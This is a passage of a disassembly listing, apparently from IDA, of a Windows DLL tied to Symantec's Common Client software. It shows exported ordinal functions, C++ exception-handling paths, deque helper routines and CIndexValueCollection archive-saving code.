		jmp	loc_6AF330EC
; ---------------------------------------------------------------------------

loc_6AF3302E:				; DATA XREF: .rdata:6AF620C4o
		push	13h
		lea	ecx, [ebp+var_178]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_178]
		call	Ordinal762
		mov	ecx, [ebp+var_17C]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_178]
		call	Ordinal764
		lea	ecx, [ebp+var_178]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF330E4
		retn
; ---------------------------------------------------------------------------

loc_6AF33080:				; DATA XREF: .rdata:6AF620D4o
		push	15h
		lea	ecx, [ebp+var_178]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_178]
		call	Ordinal762
		mov	eax, [ebp+var_180]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_178]
		call	Ordinal764
		lea	ecx, [ebp+var_178]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF330E4
		retn
; ---------------------------------------------------------------------------

loc_6AF330E4:				; DATA XREF: Ordinal144+3FCo
					; Ordinal144+460o
		mov	esi, [ebp+var_154]
		xor	ebx, ebx

loc_6AF330EC:				; CODE XREF: Ordinal144+3ABj
		lea	ecx, [ebp+var_178]
		mov	[ebp+var_4], 4
		call	Ordinal753
		test	eax, eax
		lea	ecx, [ebp+var_178]
		jz	short loc_6AF33112
		call	Ordinal752
		jmp	loc_6AF32FA1
; ---------------------------------------------------------------------------

loc_6AF33112:				; CODE XREF: Ordinal144+488j
		mov	byte ptr [ebp+var_4], 3
		call	Ordinal752
		jmp	loc_6AF32F5D
; ---------------------------------------------------------------------------

loc_6AF33120:				; CODE XREF: Ordinal144+2C8j
					; Ordinal144+312j
		lea	ecx, [ebp+var_150]
		call	Ordinal990

loc_6AF3312B:				; CODE XREF: Ordinal144+1C9j
		xor	esi, esi
		inc	esi

loc_6AF3312E:				; CODE XREF: Ordinal144+330j
		lea	ecx, [ebp+var_134]
		call	Ordinal990

loc_6AF33139:				; CODE XREF: Ordinal144+73j
		mov	ecx, [ebp+var_13C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_138]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal144	endp ; sp-analysis failed

; Exported entry 146.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal146
Ordinal146	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	offset aSoftwareSyma_0 ; "Software\\Symantec\\Common Client\\Debug"
		call	Ordinal147
		retn
Ordinal146	endp

; Exported entry 143.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal143
Ordinal143	proc near		; CODE XREF: Ordinal135+23p
					; Ordinal155+2Cp
					; DATA XREF: ...
		push	offset aSoftwareSyma_0 ; "Software\\Symantec\\Common Client\\Debug"
		call	Ordinal144
		retn
Ordinal143	endp

; Exported entry 138.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal138
Ordinal138	proc near		; CODE XREF: Ordinal137+Cp
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_28 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	[ebp+var_10], esi
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		lea	ecx, [esi+28h]
		call	sub_6AF45C0E
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
Ordinal138	endp

; Exported entry 141.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal141
Ordinal141	proc near		; CODE XREF: Ordinal140+15j
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_28 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_10], esi
		and	[ebp+var_4], 0
		lea	ecx, [esi+28h]
		call	sub_6AF32C53
		mov	ecx, [esi+4]
		sub	ecx, 10h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
Ordinal141	endp

; Exported entry 140.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal140
Ordinal140	proc near		; CODE XREF: Ordinal135+69p
					; sub_6AF3322D+3p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+38h]
		mov	dword ptr [esi], offset	off_6AF54B18
		call	Ordinal142
		lea	ecx, [esi+4]
		pop	esi
		jmp	Ordinal141
Ordinal140	endp

; Exported entry 137.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal137
Ordinal137	proc near		; CODE XREF: Ordinal135+1Bp
					; Ordinal155+24p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF54B18
		call	Ordinal138
		lea	ecx, [esi+38h]
		call	Ordinal139
		mov	ecx, esi
		call	Ordinal145
		mov	eax, esi
		pop	esi
		retn
Ordinal137	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3322D(void *, char)
sub_6AF3322D	proc near		; DATA XREF: .rdata:off_6AF54B18o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal140
		test	[esp+4+arg_0], 1
		jz	short loc_6AF33243
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF33243:				; CODE XREF: sub_6AF3322D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3322D	endp

; Exported entry 151.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal151(char	*Src)
		public Ordinal151
Ordinal151	proc near		; DATA XREF: .rdata:off_6AF66098o

Src		= dword	ptr  4

		push	esi
		push	[esp+4+Src]	; Src
		mov	esi, ecx
		call	Ordinal637
		mov	dword ptr [esi], offset	off_6AF54B1C
		mov	eax, esi
		pop	esi
		retn	4
Ordinal151	endp

; Exported entry 152.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal152
Ordinal152	proc near		; CODE XREF: sub_6AF33337+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF54B1C
		jmp	Ordinal638
Ordinal152	endp

; Exported entry 153.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal153
Ordinal153	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal675
		test	eax, eax
		jnz	short loc_6AF3327A
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF3327A:				; CODE XREF: Ordinal153+Aj
		mov	eax, [esi]
		and	dword ptr [esi+50h], 0
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+8]
		mov	ecx, esi
		mov	edi, eax
		call	Ordinal676
		mov	eax, edi
		pop	edi
		pop	esi
		retn
Ordinal153	endp

; Exported entry 154.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal154
Ordinal154	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	edi
		mov	edi, ecx
		call	Ordinal675
		test	eax, eax
		jz	short loc_6AF332CB
		mov	ecx, [esp+4+arg_0]
		push	esi
		xor	esi, esi
		push	edi
		inc	esi
		call	Ordinal149
		test	eax, eax
		jnz	short loc_6AF332B4
		xor	esi, esi

loc_6AF332B4:				; CODE XREF: Ordinal154+1Cj
		mov	ecx, edi
		call	Ordinal648
		test	eax, eax
		jnz	short loc_6AF332C1
		xor	esi, esi

loc_6AF332C1:				; CODE XREF: Ordinal154+29j
		mov	ecx, edi
		call	Ordinal676
		mov	eax, esi
		pop	esi

loc_6AF332CB:				; CODE XREF: Ordinal154+Aj
		pop	edi
		retn	4
Ordinal154	endp

; Exported entry 155.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal155
Ordinal155	proc near		; DATA XREF: .rdata:6AF54B24o
					; .rdata:off_6AF66098o

var_6C		= byte ptr -6Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 6Ch
		push	esi
		mov	esi, ecx
		call	Ordinal675
		test	eax, eax
		jz	short loc_6AF33334
		xor	eax, eax
		inc	eax
		cmp	dword ptr [esi+50h], 0
		push	edi
		mov	edi, eax
		jnz	short loc_6AF3332A
		lea	ecx, [ebp+var_6C]
		mov	[esi+50h], eax
		call	Ordinal137
		lea	ecx, [ebp+var_6C]
		call	Ordinal143
		test	eax, eax
		lea	ecx, [ebp+var_6C]
		jnz	short loc_6AF3330B
		xor	edi, edi
		jmp	short loc_6AF33325
; ---------------------------------------------------------------------------

loc_6AF3330B:				; CODE XREF: Ordinal155+36j
		push	esi
		call	Ordinal149
		test	eax, eax
		jz	short loc_6AF33320
		mov	ecx, esi
		call	Ordinal679
		test	eax, eax
		jnz	short loc_6AF33322

loc_6AF33320:				; CODE XREF: Ordinal155+44j
		xor	edi, edi

loc_6AF33322:				; CODE XREF: Ordinal155+4Fj
		lea	ecx, [ebp+var_6C]

loc_6AF33325:				; CODE XREF: Ordinal155+3Aj
		call	Ordinal140

loc_6AF3332A:				; CODE XREF: Ordinal155+1Cj
		mov	ecx, esi
		call	Ordinal676
		mov	eax, edi
		pop	edi

loc_6AF33334:				; CODE XREF: Ordinal155+10j
		pop	esi
		leave
		retn
Ordinal155	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF33337(void *, char)
sub_6AF33337	proc near		; DATA XREF: .rdata:off_6AF54B1Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal152
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3334D
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3334D:				; CODE XREF: sub_6AF33337+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF33337	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33353	proc near		; CODE XREF: sub_6AF3351E+16p
					; sub_6AF335E9+Bp ...
		mov	edx, [ecx+4]
		mov	ecx, [ecx]
		push	esi
		mov	esi, [ecx+8]
		mov	eax, edx
		sub	eax, edx
		cmp	esi, edx
		ja	short loc_6AF33366
		sub	edx, esi

loc_6AF33366:				; CODE XREF: sub_6AF33353+Fj
		mov	ecx, [ecx+4]
		mov	ecx, [ecx+edx*4]
		lea	eax, [eax+eax*8]
		lea	eax, [ecx+eax*8]
		pop	esi
		retn
sub_6AF33353	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33374	proc near		; CODE XREF: sub_6AF334D7+Ep
					; sub_6AF334FE+3p ...
		push	esi
		mov	esi, ecx
		mov	ecx, [esi]
		test	ecx, ecx
		jz	short loc_6AF33385
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		and	dword ptr [esi], 0

loc_6AF33385:				; CODE XREF: sub_6AF33374+7j
		pop	esi
		retn
sub_6AF33374	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF33387	proc near		; CODE XREF: sub_6AF33782+Dp

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_29 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aInvalidDequeTS ; "invalid deque<T> subscript"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61F1C
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF548A0
		call	_CxxThrowException
sub_6AF33387	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_6AF333C8	proc near		; CODE XREF: sub_6AF335E9+21p
					; sub_6AF33615+2Ap ...

arg_0		= dword	ptr  4

		mov	edx, [ecx]
		mov	eax, [esp+arg_0]
		cmp	edx, [eax]
		jnz	short loc_6AF333DF
		mov	ecx, [ecx+4]
		cmp	ecx, [eax+4]
		jnz	short loc_6AF333DF
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF333E1
; ---------------------------------------------------------------------------

loc_6AF333DF:				; CODE XREF: sub_6AF333C8+8j
					; sub_6AF333C8+10j
		xor	eax, eax

locret_6AF333E1:			; CODE XREF: sub_6AF333C8+15j
		retn	4
sub_6AF333C8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF333E4	proc near		; CODE XREF: sub_6AF33A07+1Ep

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_29 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aDequeTTooLong ;	"deque<T> too long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
sub_6AF333E4	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF33425(void	*Dst, void *Src, int)
sub_6AF33425	proc near		; CODE XREF: sub_6AF3353D+46p
					; sub_6AF3436F+51p ...

Dst		= dword	ptr  4
Src		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		add	eax, eax
		push	eax		; Size
		push	[esp+4+Src]	; Src
		push	[esp+8+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch
		retn
sub_6AF33425	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3343D(void	*Dst, void *Src, int)
sub_6AF3343D	proc near		; CODE XREF: sub_6AF3436F+46p

Dst		= dword	ptr  4
Src		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		add	eax, eax
		push	eax		; Size
		push	[esp+4+Src]	; Src
		push	[esp+8+Dst]	; Dst
		call	ds:memmove
		add	esp, 0Ch
		retn
sub_6AF3343D	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33456	proc near		; CODE XREF: sub_6AF3436F+5Ep
					; sub_6AF376DF+1Dp ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		test	eax, eax
		jl	short loc_6AF33472
		mov	edx, [ecx]
		cmp	eax, [edx-8]
		jg	short loc_6AF33472
		mov	[edx-0Ch], eax
		mov	ecx, [ecx]
		and	word ptr [ecx+eax*2], 0
		retn	4
; ---------------------------------------------------------------------------

loc_6AF33472:				; CODE XREF: sub_6AF33456+6j
					; sub_6AF33456+Dj
		push	80070057h
		call	sub_6AF3110D
sub_6AF33456	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3347D(void	*Src, int, void	*Dst)
sub_6AF3347D	proc near		; CODE XREF: sub_6AF335CC+13p

Src		= dword	ptr  4
arg_4		= dword	ptr  8
Dst		= dword	ptr  0Ch

		mov	eax, [esp+arg_4]
		sub	eax, [esp+Src]
		push	esi
		sar	eax, 2
		mov	esi, eax
		shl	esi, 2
		push	esi		; Size
		push	[esp+8+Src]	; Src
		push	[esp+0Ch+Dst]	; Dst
		call	ds:memmove
		add	esp, 0Ch
		add	eax, esi
		pop	esi
		retn
sub_6AF3347D	endp

; Exported entry 160.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal160
Ordinal160	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+88h]
		mov	ecx, [ebp+arg_0]
		mov	[ecx], eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	al, 1
		pop	esi
		leave
		retn	4
Ordinal160	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF334D7	proc near		; CODE XREF: Ordinal175+43p
					; Ordinal290+46p ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		push	edi
		mov	edi, [esp+8+arg_0]
		cmp	edi, eax
		jz	short loc_6AF334F9
		call	sub_6AF33374
		test	edi, edi
		mov	[esi], edi
		jz	short loc_6AF334F7
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+4]

loc_6AF334F7:				; CODE XREF: sub_6AF334D7+17j
		mov	eax, [esi]

loc_6AF334F9:				; CODE XREF: sub_6AF334D7+Cj
		pop	edi
		pop	esi
		retn	4
sub_6AF334D7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF334FE	proc near		; CODE XREF: Ordinal163+45p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF33374
		mov	ecx, [esp+4+arg_0]
		test	ecx, ecx
		jz	short loc_6AF33518
		mov	eax, [ecx]
		push	esi
		push	offset dword_6AF544AC
		call	dword ptr [eax]

loc_6AF33518:				; CODE XREF: sub_6AF334FE+Ej
		mov	eax, [esi]
		pop	esi
		retn	4
sub_6AF334FE	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3351E	proc near		; CODE XREF: sub_6AF33C47+73p
					; sub_6AF33C47+B5p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ecx+4]
		mov	edx, [ecx]
		add	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		call	sub_6AF33353
		leave
		retn	4
sub_6AF3351E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3353D	proc near		; CODE XREF: sub_6AF33854+1Ap

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ecx]
		mov	ebx, [esi-0Ch]
		sub	esi, 10h
		mov	[ebp+var_8], ecx
		mov	ecx, [esi]
		mov	eax, [ecx]
		push	edi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+10h]
		mov	edx, [eax]
		push	2
		push	[ebp+arg_0]
		mov	ecx, eax
		call	dword ptr [edx]
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF33570
		call	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF33570:				; CODE XREF: sub_6AF3353D+2Cj
		mov	eax, [ebp+arg_0]
		cmp	ebx, eax
		jge	short loc_6AF33579
		mov	eax, ebx

loc_6AF33579:				; CODE XREF: sub_6AF3353D+38j
		inc	eax
		push	eax		; int
		lea	eax, [esi+10h]
		push	eax		; Src
		lea	ebx, [edi+10h]
		push	ebx		; Dst
		call	sub_6AF33425
		mov	eax, [ebp+var_4]
		add	esp, 0Ch
		mov	ecx, esi
		mov	[edi+4], eax
		call	sub_6AF3160D
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		mov	[eax], ebx
		pop	ebx
		leave
		retn	4
sub_6AF3353D	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF335A4	proc near		; CODE XREF: sub_6AF33854+3Ep

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		push	2
		push	[esp+8+arg_0]
		sub	eax, 10h
		mov	ecx, [eax]
		mov	edx, [ecx]
		push	eax
		call	dword ptr [edx+8]
		test	eax, eax
		jnz	short loc_6AF335C3
		call	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF335C3:				; CODE XREF: sub_6AF335A4+18j
		add	eax, 10h
		mov	[esi], eax
		pop	esi
		retn	4
sub_6AF335A4	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF335CC(void	*Src, int, void	*Dst, int)
sub_6AF335CC	proc near		; CODE XREF: sub_6AF33A07+64p
					; sub_6AF33A07+89p ...

var_4		= dword	ptr -4
Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch
Dst		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+Dst]	; Dst
		push	[ebp+arg_4]	; int
		push	[ebp+Src]	; Src
		call	sub_6AF3347D
		add	esp, 14h
		leave
		retn
sub_6AF335CC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF335E9	proc near		; CODE XREF: sub_6AF33C47+93p
					; sub_6AF33C47+122p ...

arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		jmp	short loc_6AF33603
; ---------------------------------------------------------------------------

loc_6AF335EE:				; CODE XREF: sub_6AF335E9+28j
		push	[ebp+arg_10]
		lea	ecx, [ebp+arg_0]
		call	sub_6AF33353
		mov	ecx, eax
		call	Ordinal248
		inc	[ebp+arg_4]

loc_6AF33603:				; CODE XREF: sub_6AF335E9+3j
		lea	eax, [ebp+arg_8]
		lea	ecx, [ebp+arg_0]
		push	eax
		call	sub_6AF333C8
		test	al, al
		jz	short loc_6AF335EE
		pop	ebp
		retn
sub_6AF335E9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33615	proc near		; CODE XREF: sub_6AF338C3+1Bp

arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= byte ptr  14h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		jmp	short loc_6AF33638
; ---------------------------------------------------------------------------

loc_6AF3361A:				; CODE XREF: sub_6AF33615+31j
		lea	ecx, [ebp+arg_4]
		call	sub_6AF33353
		push	eax
		lea	ecx, [ebp+arg_14]
		call	sub_6AF33353
		mov	ecx, eax
		call	Ordinal248
		inc	[ebp+arg_18]
		inc	[ebp+arg_8]

loc_6AF33638:				; CODE XREF: sub_6AF33615+3j
		lea	eax, [ebp+arg_C]
		lea	ecx, [ebp+arg_4]
		push	eax
		call	sub_6AF333C8
		test	al, al
		jz	short loc_6AF3361A
		mov	ecx, [ebp+arg_14]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+arg_18]
		mov	[eax+4], ecx
		pop	ebp
		retn
sub_6AF33615	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33658	proc near		; CODE XREF: sub_6AF3389B+1Bp

arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch
arg_C		= byte ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		jmp	short loc_6AF3367B
; ---------------------------------------------------------------------------

loc_6AF3365D:				; CODE XREF: sub_6AF33658+31j
		dec	[ebp+arg_10]
		dec	[ebp+arg_18]
		lea	ecx, [ebp+arg_C]
		call	sub_6AF33353
		push	eax
		lea	ecx, [ebp+arg_14]
		call	sub_6AF33353
		mov	ecx, eax
		call	Ordinal248

loc_6AF3367B:				; CODE XREF: sub_6AF33658+3j
		lea	eax, [ebp+arg_C]
		lea	ecx, [ebp+arg_4]
		push	eax
		call	sub_6AF333C8
		test	al, al
		jz	short loc_6AF3365D
		mov	ecx, [ebp+arg_14]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+arg_18]
		mov	[eax+4], ecx
		pop	ebp
		retn
sub_6AF33658	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3369B	proc near		; CODE XREF: sub_6AF33E8C+52p

var_8		= dword	ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_C]
		mov	[ebp+arg_8], ecx
		mov	ecx, [ebp+arg_4]
		sub	eax, ecx
		mov	ecx, [ebp+arg_10]
		add	[ecx], eax
		leave
		retn
sub_6AF3369B	endp

; Exported entry 179.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal179
Ordinal179	proc near		; DATA XREF: .rdata:6AF54D28o
					; .rdata:off_6AF66098o

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	edi
		push	[ebp+arg_0]
		mov	edi, ecx
		call	Ordinal297
		test	al, al
		jnz	short loc_6AF336D7
		push	offset aCindexvaluecol ; "CIndexValueCollection::SaveArchive() : "...
		jmp	short loc_6AF336FC
; ---------------------------------------------------------------------------

loc_6AF336D7:				; CODE XREF: Ordinal179+13j
		mov	ecx, [ebp+arg_0]
		push	1
		call	Ordinal330
		test	eax, eax
		jz	short loc_6AF336F7
		push	dword ptr [edi+88h]
		mov	ecx, [ebp+arg_0]
		call	Ordinal324
		test	eax, eax
		jnz	short loc_6AF33706

loc_6AF336F7:				; CODE XREF: Ordinal179+28j
		push	offset aCindexvaluec_0 ; "CIndexValueCollection::SaveArchive() : "...

loc_6AF336FC:				; CODE XREF: Ordinal179+1Aj
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF3377D
; ---------------------------------------------------------------------------

loc_6AF33706:				; CODE XREF: Ordinal179+3Aj
		push	ebx
		push	esi		; Args
		lea	esi, [edi+78h]
		mov	eax, [esi+0Ch]
		mov	[ebp+var_1], 1
		xor	ebx, ebx
		mov	[ebp+var_C], esi
		mov	[ebp+var_8], eax
		jmp	short loc_6AF33744
; ---------------------------------------------------------------------------

loc_6AF3371C:				; CODE XREF: Ordinal179+A3j
		mov	ecx, [ebp+arg_0]
		push	ebx
		call	Ordinal324
		test	eax, eax
		jz	short loc_6AF33762
		lea	ecx, [ebp+var_C]
		call	sub_6AF33353
		push	eax
		push	[ebp+arg_0]
		mov	ecx, edi
		call	Ordinal300
		test	al, al
		jz	short loc_6AF33769
		inc	ebx
		inc	[ebp+var_8]

loc_6AF33744:				; CODE XREF: Ordinal179+5Fj
		mov	eax, [esi+10h]
		add	eax, [esi+0Ch]
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_10], eax
		lea	eax, [ebp+var_14]
		push	eax
		mov	[ebp+var_14], esi
		call	sub_6AF333C8
		test	al, al
		jz	short loc_6AF3371C
		jmp	short loc_6AF33778
; ---------------------------------------------------------------------------

loc_6AF33762:				; CODE XREF: Ordinal179+6Cj
		push	offset aCindexvaluec_1 ; "CIndexValueCollection::SAveArchive() : "...
		jmp	short loc_6AF3376E
; ---------------------------------------------------------------------------

loc_6AF33769:				; CODE XREF: Ordinal179+83j
		push	offset aCindexvaluec_2 ; "CIndexValueCollection::SaveArchive() : "...

loc_6AF3376E:				; CODE XREF: Ordinal179+ACj
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_1], 0

loc_6AF33778:				; CODE XREF: Ordinal179+A5j
		mov	al, [ebp+var_1]
		pop	esi
		pop	ebx

loc_6AF3377D:				; CODE XREF: Ordinal179+49j
		pop	edi
		leave
		retn	4
Ordinal179	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33782	proc near		; CODE XREF: Ordinal176+27p
					; Ordinal177+2Ap ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	edx, [ebp+arg_0]
		cmp	[ecx+10h], edx
		ja	short loc_6AF33794
		call	sub_6AF33387
; ---------------------------------------------------------------------------

